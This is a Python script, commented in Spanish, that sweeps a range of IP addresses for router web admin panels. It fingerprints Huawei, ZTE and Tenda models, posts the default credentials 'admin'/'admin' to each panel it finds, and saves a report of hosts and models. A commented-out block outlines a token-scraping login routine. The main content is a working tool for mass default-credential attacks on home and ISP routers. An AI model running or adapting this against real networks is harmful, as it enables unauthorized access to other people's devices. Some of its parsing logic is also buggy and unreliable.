#!/usr/bin/env python3

import requests, time, os
import contextlib,signal,threading
from bs4 import BeautifulSoup
import re
from soupsieve import match
import urllib3


#Variables Globales
attmp = 1
avrouters = 0
dsrouters = 0
hw = 0
zt = 0
brands = {
    "Huawei": ['EG8141A5','HG8546M'],
    "ZTE": ['F660','ZXHN-F673AV9'],
    "Tenda":["red"]
}
payload = {
    'Username': 'admin',
    'Password': 'admin'
}

#Solicitud de objetivos 
target = input("Please enter the Target or Targets: ")
if int(target[10]) == 0:
    index = list(target)
    index[10] =""
    target = "".join(index)
    limit = int(input("introduzca la cantidad de ip a escanear (0 - 255): "))
else:
    attmp = int(target[10])
    limit = attmp
#Representacion grafica del Proceso de escaneo      
print("\n Scaning...\n")
time.sleep(2)

#Variables especificas  
#validip = []
models = []
#Bucle de busquedad de objetivos
while attmp <= limit:   
    if  limit == attmp: 
        ip = target 
    else:
        ip = target + str(attmp) 
    ipls = ip[-1]
    if ipls == '.' : 
        ip = target + str(attmp)
    attmp = attmp + 1
    url = 'http://' + ip + ':80'
    try:
        #Solicitud a las Urls objetivos
        r = requests.get(url, timeout=3)
        r.raise_for_status()
        if r.status_code == 200:
            #Tareas a realizar si los objetivos son validos 
            print("\n[+] Positive Result: ")
            print('[+] Login for Web Admin Panel Found on '+ url)
            print('[+] status code : ',r.status_code)
            avrouters += 1
            #validip.append(url)
            # headers = {'Accept-Encoding': 'identity'}
            # info = requests.get(url, headers=headers)
            html = r.content
            soup = BeautifulSoup(html, "lxml")
            # print('\n',dict(info.headers),'\n')
            # print(soup.prettify())  
            tag = str(soup.find('title'))
            model = tag.strip("</title>")
            print("[+] Product Name o Modelo: ",model)

            if model == '' or r.status_code != 200: #script 
                urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
                url = 'https://' + ip + ':80'
                r = requests.get(url, timeout=5, allow_redirects=False,verify=False)
                html = r.text
                soup = BeautifulSoup(html, "lxml")
                tag = re.sub('','', html)
                #tag = str(soup.find('<title>'))
                #print(tag)
                match = re.search(r'var ProductName = ..........',tag)
                model = match.group().strip("var ProductName =';")
                # print(model)
                print("[+] Product Name o Modelo: ",model)

            with requests.Session() as s:
                p = s.post(url, data=payload)
                print(p.text)    

            if model in brands['ZTE']:
                zt = zt + 1
            elif model in brands['Huawei']:
                hw = hw + 1
            info = url +' ---> '+ model 
            models.append(info)

    except Exception:
        #Tareas a realizar si los objetivos son invalidos
        dsrouters += 1
        print("\n[-] Negative Result: ")
        print('[-] Login for Web Admin Panel Not Found on '+ url,'status not found')

time.sleep(1)

#Salida de reportes por pantalla y en archivo de texto 
print("Printing scan results.. \n")
time.sleep(3)
print('Hosts Avaliable: ',avrouters)  
print('Hosts not found: ', dsrouters)  
print('Huawei Devices: ', hw) 
print('ZTE Devices: ', zt)

su_name = input("\nIntroduzca un nombre para el archivo de reporte: ")
file_path = su_name + '.txt'
with open(file_path, "w") as o:
    with contextlib.redirect_stdout(o):
        #validip = str(validip).strip("[,]")
        models = str(models).strip("[(,)]")
        #print("\nValid IP: ", validip)
        print("Modelos & IP: ", models)
        print('Hosts Avaliable: ',avrouters)  
        print('Hosts not found: ', dsrouters) 
        print('Huawei Devices: ', hw) 
        print('ZTE Devices: ', zt)

# with requests.session() as sess:
#     post_data = sess.get(url)
#     html = BeautifulSoup(post_data.text, 'html.parser')
#     #Update data
#     data.update(timestamp_secret = html.find("input", {'name':'timestamp_secret'}).get('value'))
#     data.update(authenticity_token= html.find("input", {'name':'authenticity_token'}).get('value'))
#     data.update(timestamp = html.find("input", {'name':'timestamp'}).get('value'))
#     #Login
#     res = sess.post(url, data=data, headers=headers)
#     #Check login
#     res = sess.get(url)
#     try:
#         username = BeautifulSoup(res.text, 'html.parser').find('meta', {'name': 'user-login'}).get('content')
#     except:
#         print ('Your username or password is incorrect')
#     else:
#         print ("You have successfully logged in as", username)
        

